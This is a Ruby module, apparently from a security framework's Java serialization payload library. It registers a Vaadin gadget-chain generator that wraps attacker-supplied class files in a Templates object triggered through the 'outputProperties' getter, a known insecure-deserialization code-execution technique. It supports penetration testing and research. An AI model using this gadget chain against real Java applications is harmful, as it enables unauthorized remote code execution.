# -*- coding: binary -*-
require_relative '../../payloads/vaadin'
require_relative '../../payloads/templates'

S=Rex::Java::Serialization 
class Vaadin < S::Generator::Gadget
  def id
    'vaadin'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('vaadin')

    unless params.fetch('classfiles', nil).nil?
      return false unless S::Generator::Templates.supported(ctx,params)
    end

    true
  end

  def create(ctx, params: {})
    ctx.reg.load('model/vaadin.json')

    if !params.fetch('classfiles', nil).nil?
      S::Payloads::Vaadin.make_get_property(
        S::Generator::Templates.make(ctx,params), 
        'outputProperties')
    else
      raise 'Missing parameters'
    end
  end
end

S::Generator.register(
  Vaadin.new
)
